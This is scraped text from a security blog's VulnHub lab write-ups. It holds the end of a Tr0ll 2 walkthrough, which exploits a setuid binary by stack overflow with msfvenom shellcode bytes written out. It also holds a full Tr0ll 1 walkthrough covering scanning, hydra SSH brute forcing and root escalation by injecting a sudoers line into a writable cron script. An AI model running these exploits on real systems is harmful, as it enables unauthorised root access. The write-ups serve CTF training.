/nothing_to_see_here/choose_wisely/door2:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 <span class="nb">.</span>
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
<span class="nt">-rwsr-xr-x</span> 1 root root 8401 Oct  5  2014 r00t

/nothing_to_see_here/choose_wisely/door3:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 <span class="nb">.</span>
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
<span class="nt">-rwsr-xr-x</span> 1 root root 7273 Oct  5  2014 r00t
</code></pre></div></div>

<p>We copy the binary of the door2 to the current working directory to analyze it, since the binaries every certain period of time change their gate.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span><span class="nb">cp</span> /nothing_to_see_here/choose_wisely/door2/r00t <span class="nb">.</span>
</code></pre></div></div>

<p>We check if gdb is installed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>which gdb
which gdb
/usr/bin/gdb
noob@Tr0ll2:~<span class="err">$</span>
</code></pre></div></div>

<p>With the <strong>file</strong> command we can verify that it is a 32-bit binary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>file r00t
file r00t
r00t: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>0x438546c50f77d4bac3e0c41b4f8bcd60899c4006, not stripped
noob@Tr0ll2:~<span class="err">$</span>
</code></pre></div></div>

<p>The ASLR protection is disabled.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space 
0
noob@Tr0ll2:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="setuid-binary">SETUID Binary</h3>

<p>We disassemble the r00t binary with gdb, and list the functions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>gdb <span class="nt">-q</span> ./r00t
gdb <span class="nt">-q</span> ./r00t
Reading symbols from /home/noob/r00t...done.
<span class="o">(</span>gdb<span class="o">)</span> info functions
All defined functions:

File bof.c:
int main<span class="o">(</span>int, char <span class="k">**</span><span class="o">)</span><span class="p">;</span>

Non-debugging symbols:
0x080482f4  _init
0x08048340  <span class="nb">printf
</span>0x08048340  <span class="nb">printf</span>@plt
0x08048350  strcpy
0x08048350  strcpy@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  <span class="nb">exit
</span>0x08048370  <span class="nb">exit</span>@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
<span class="o">(</span>gdb<span class="o">)</span> 
</code></pre></div></div>

<p>On the attacking machine we generate a string of 300 characters with <strong>pattern_create</strong> utility.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msf-pattern_create <span class="nt">-l</span> 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
</code></pre></div></div>

<p>We run the binary with the generated string, and we see that it caused a crash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /home/noob/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 <span class="k">in</span> ?? <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span>
</code></pre></div></div>

<p>We identify the offset with the <strong>pattern_offset</strong> utility at 268 characters, as shown below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 300 <span class="nt">-q</span> 0x6a413969
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 268
root@kali:~<span class="err">$</span>
</code></pre></div></div>

<p>We check if we control the <strong>eip</strong> register as follows.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print('A'*268 + 'B'*4 + 'C'*100)"</span><span class="si">)</span>
Starting program: /home/noob/r00t <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print('A'*268 + 'B'*4 + 'C'*100)"</span><span class="si">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<p>As we can see above the return address was controlled.</p>

<p>We verify the address to the <strong>esp</strong> register to locate our shellcode there, <strong>0xbffffb80</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/40wx <span class="nv">$esp</span>
0xbffffb80:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffb90:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffba0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffbb0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffbc0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffbd0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffbe0:     0x43434343      0x08048300      0x00000000      0x080483b1
0xbffffbf0:     0x08048444      0x00000002      0xbffffc14      0x080484b0
0xbffffc00:     0x08048520      0xb7fed280      0xbffffc0c      0xb7fff918
0xbffffc10:     0x00000002      0xbffffd2c      0xbffffd3c      0x00000000
</code></pre></div></div>

<p>We generate our shellcode in this case msfvenom generates one of 70 bytes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x86/exec <span class="nv">cmd</span><span class="o">=</span>/bin/sh <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> python <span class="nt">-o</span> shellcode.txt 
</code></pre></div></div>

<p>We copy the shellcode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'".*"'</span> shellcode.txt | <span class="nb">sed</span> <span class="s1">'s/"//g'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> c
</code></pre></div></div>

<p>We build our malicious instruction as follows, first with 268 A’s, then with the return address <strong>0xbffffb80</strong>, then with 10 NOPs (\x90) and finally with the shellcode.</p>

<p>To run our malicious instruction we need to find the vulnerable binary, in this case the one with size 8401, and run it, giving us a root shell, if you notice we change the hex value from 80 to 60, since the address is different outside of gdb.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>find /nothing_to_see_here/ <span class="nt">-size</span> 8401c <span class="nt">-name</span> r00t
/nothing_to_see_here/choose_wisely/door2/r00t

noob@Tr0ll2:~<span class="nv">$ </span><span class="si">$(</span><span class="o">!!</span><span class="si">)</span> <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print('A'*268 + '</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf' + '</span><span class="se">\x</span><span class="s2">90'*10 + '</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">b5</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">36')"</span><span class="si">)</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>noob<span class="o">)</span>
bash <span class="nt">-i</span>
bash: no job control <span class="k">in </span>this shell
root@Tr0ll2:/home/noob#
</code></pre></div></div>

<p>We read the flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Tr0ll2:/root# <span class="nb">cat </span>Proof.txt
<span class="nb">cat </span>Proof.txt
You win this <span class="nb">time </span>young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Tr0ll 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.</p>

<p><strong>Author:</strong> Maleus</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To gain root and get Proof.txt from the /root directory.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/tr0ll-1,100/">https://www.vulnhub.com/entry/tr0ll-1,100/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>To discover the target machine on the local network an ARP scan was performed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1  192.168.179.0/24 
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.182 00:0c:29:39:e9:62       VMware, Inc.
192.168.179.254 00:50:56:ec:aa:69       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>With the aim of discover open ports a full UDP/TCP scan was did with unicornscan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-msf</span> <span class="nt">-p1-65535</span> 192.168.179.182 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-p1-65535</span> 192.168.179.182 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 
TCP open                     ftp[   21]         from 192.168.179.182  ttl 64 
TCP open                     ssh[   22]         from 192.168.179.182  ttl 64 
TCP open                    http[   80]         from 192.168.179.182  ttl 64
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>An aggressive scan was performed to detect the services and versions of the open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p21</span>,22,80 <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 192.168.179.182 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION                                                                                                                                        
21/tcp open  ftp     vsftpd 3.0.2                                                                                                                                   
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>                                                                                                              
|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap <span class="o">[</span>NSE: writeable]                                                                                 
| ftp-syst:                                                                                                                                                         
|   STAT:                                                                                                                                                           
| FTP server status:                                                                                                                                                
|      Connected to 192.168.179.1                                                                                                                                   
|      Logged <span class="k">in </span>as ftp                                                                                                                                             
|      TYPE: ASCII                                                                                                                                                  
|      No session bandwidth limit                                                                                                                                   
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 600                                                                                                                            
|      Control connection is plain text                                                                                                                             
|      Data connections will be plain text                                                                                                                          
|      At session startup, client count was 2                                                                                                                       
|      vsFTPd 3.0.2 - secure, fast, stable                                                                                                                          
|_End of status                                                                                                                                                     
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>                                                                                   
| ssh-hostkey:                                                                                                                                                      
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 <span class="o">(</span>DSA<span class="o">)</span>                                                                                                      
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db <span class="o">(</span>RSA<span class="o">)</span>
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
...
</span></code></pre></div></div>

<h3 id="ftp-enumeration">FTP Enumeration</h3>

<p>As we can see the anonymous login is enabled in the FTP service, we login and download the <strong>lol.pcap</strong> file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ftp 192.168.179.182
Connected to 192.168.179.182.
220 <span class="o">(</span>vsFTPd 3.0.2<span class="o">)</span>
Name <span class="o">(</span>192.168.179.182:s4rgaz<span class="o">)</span>: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        112          4096 Aug 09  2014 <span class="nb">.</span>
drwxr-xr-x    2 0        112          4096 Aug 09  2014 ..
<span class="nt">-rwxrwxrwx</span>    1 1000     0            8068 Aug 09  2014 lol.pcap
226 Directory send OK.
ftp&gt; get lol.pcap
<span class="nb">local</span>: lol.pcap remote: lol.pcap
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>lol.pcap <span class="o">(</span>8068 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
8068 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>1.5741 MB/s<span class="o">)</span>
ftp&gt; quit
221 Goodbye.
</code></pre></div></div>

<p>We analyze the pcap file with tshark and found the resource <strong>sup3rs3cr3tdirlol</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>tshark <span class="nt">-r</span> lol.pcap <span class="nt">-Y</span> <span class="s1">'ftp-data'</span> <span class="nt">-T</span> fields <span class="nt">-e</span> text 2&gt;/dev/null
Timestamps,-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt<span class="se">\r\n</span>
Timestamps,Well, well, well, aren<span class="s1">'t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n,\n,Sucks, you were so close... gotta TRY HARDER!\n
Timestamps,-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt\r\n
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Browsing the web page, an image is displayed on the screen.</p>

<p><img src="/assets/images/tr0ll1/screenshot-1.png" alt="" /></p>

<p>Then, I Browsed to the <strong>sup3rs3cr3tdirlol</strong> directory.</p>

<p><img src="/assets/images/tr0ll1/screenshot-2.png" alt="" /></p>

<p>We download the <strong>roflmao</strong> file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.179.182/sup3rs3cr3tdirlol/roflmao
</code></pre></div></div>

<p>It’s a binary file, so I grant execution permissions, execute it, and it shows the address <strong>0x0856BF</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod</span> +x roflmao

root@kali:~<span class="nv">$ </span>./roflmao 
Find address 0x0856BF to proceed
</code></pre></div></div>

<p>Browing the address <strong>0x0856BF</strong>, it contains two directories.</p>

<p><img src="/assets/images/tr0ll1/screenshot-3.png" alt="" /></p>

<p>Inside the <strong>good_look</strong> directory ther is a file with a list of words, these look like usernames.</p>

<p><img src="/assets/images/tr0ll1/screenshot-4.png" alt="" /></p>

<p>We download the usernames and save them to a file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.182/0x0856BF/good_luck/which_one_lol.txt | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> | <span class="nb">tee </span>users.txt 
maleus
ps-aux
felux
Eagle11
genphlux
usmc8892
blawrg
wytshadow
vis1t0r
overflow
</code></pre></div></div>

<p>Inside the folder <strong>this_folder_contains_the_password</strong> there is a file called <strong>Pass.txt</strong>.</p>

<p><img src="/assets/images/tr0ll1/screenshot-5.png" alt="" /></p>

<p>We download the possible password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.182/0x0856BF/this_folder_contains_the_password/Pass.txt | <span class="nb">tee </span>pass.txt     
Good_job_:<span class="o">)</span>
</code></pre></div></div>

<p>We performed a wordlist attack with hydra but the password doesn’t work.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> pass.txt ssh://192.168.179.182
...
1 of 1 target completed, 0 valid password found
...
</code></pre></div></div>

<p>The password may be the name of the file <strong>Pass.txt</strong>.</p>

<p><img src="/assets/images/tr0ll1/screenshot-6.png" alt="" /></p>

<p>We copy <strong>Pass.txt</strong> to a file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Pass.txt"</span> <span class="o">&gt;</span> pass.txt
</code></pre></div></div>

<p>We brute force again and find the password for the user <strong>overflow</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> pass.txt ssh://192.168.179.182
...
<span class="o">[</span>22][ssh] host: 192.168.179.182   login: overflow   password: Pass.txt
...
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>We login via SSH as user overflow.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh overflow@192.168.179.182                  
overflow@192.168.179.182<span class="s1">'s password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
Could not chdir to home directory /home/overflow: No such file or directory
$ bash 
overflow@troll:/$
</span></code></pre></div></div>

<p>The server closes the connection every five minutes, kicking us out of the system.</p>

<p>When listing the writable files the <strong>cronlog</strong> and <strong>cleaner.py</strong> files look interesting.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/var/www/html<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'proc|sys'</span>
/srv/ftp/lol.pcap
/var/tmp/cleaner.py.swp
/var/www/html/sup3rs3cr3tdirlol/roflmao
/var/log/cronlog
/lib/log/cleaner.py
</code></pre></div></div>

<p>The <strong>cleaner.py</strong> script has read, write and execute permissions for all users, we see that it deletes the content inside the /tmp directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /lib/log/cleaner.py
<span class="nt">-rwxrwxrwx</span> 1 root root 172 Jan 26 20:55 /lib/log/cleaner.py

overflow@troll:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> /lib/log/cleaner.py
<span class="c">#!/usr/bin/env python</span>
import os
import sys
try:
        os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
except:
        sys.exit<span class="o">()</span>
</code></pre></div></div>

<p>The <strong>cronlog</strong> file shows that the <strong>cleaner.py</strong> script executes every two minutes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /var/log/cronlog
<span class="nt">-rwxrwxrwx</span> 1 root root 23 Aug 13  2014 /var/log/cronlog

overflow@troll:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> /var/log/cronlog
<span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> cleaner.py
overflow@troll:/var/www/html<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="cron-job">Cron Job</h3>

<p>We edit the <strong>cleaner.py</strong> script as follows to add to the user overflow to the sudoers file allowing him to execute /bin/bash without password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/<span class="nv">$ </span><span class="nb">cat</span> /lib/log/cleaner.py                                                                                                                           
<span class="c">#!/usr/bin/env python                                                                                                                                               </span>
import os                                                                                                                                                           
import sys                                                                                                                                                          
try:                                                                                                                                                                
        os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>                                                                                                                                  
        os.system<span class="o">(</span><span class="s1">'echo "overflow ALL=(ALL) NOPASSWD: /bin/bash" &gt;&gt; /etc/sudoers'</span><span class="o">)</span>                                                                                   
except:                                                                                                                                                             
        sys.exit<span class="o">()</span>
        
overflow@troll:/<span class="err">$</span>
</code></pre></div></div>

<p>After few minutes we run /bin/bash with the sudo command, and we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>overflow@troll:/<span class="nv">$ </span><span class="nb">sudo</span> /bin/bash
<span class="nb">sudo</span>: unable to resolve host troll
root@troll:/#
</code></pre></div></div>

<p>We list the cron jobs and show the script that kicks us out of the system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@troll:/# crontab <span class="nt">-l</span> | <span class="nb">tail</span> <span class="nt">-2</span>
<span class="k">*</span>/5 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> /usr/bin/python /opt/lmao.py
<span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> /usr/bin/python /lib/log/cleaner.py

root@troll:/# <span class="nb">cat</span> /opt/lmao.py
<span class="c">#!/usr/bin/env python</span>
import os

os.system<span class="o">(</span><span class="s1">'echo "TIMES UP LOL!"|wall'</span><span class="o">)</span>
os.system<span class="o">(</span><span class="s2">"pkill -u 'overflow'"</span><span class="o">)</span>
sys.exit<span class="o">()</span>

root@troll:/#
</code></pre></div></div>

<p>We move to the root directory and read the flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@troll:/# <span class="nb">cd </span>root/
root@troll:/root# <span class="nb">ls
</span>proof.txt
root@troll:/root# <span class="nb">cat </span>proof.txt 
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
root@troll:/root#
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Wintermute</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

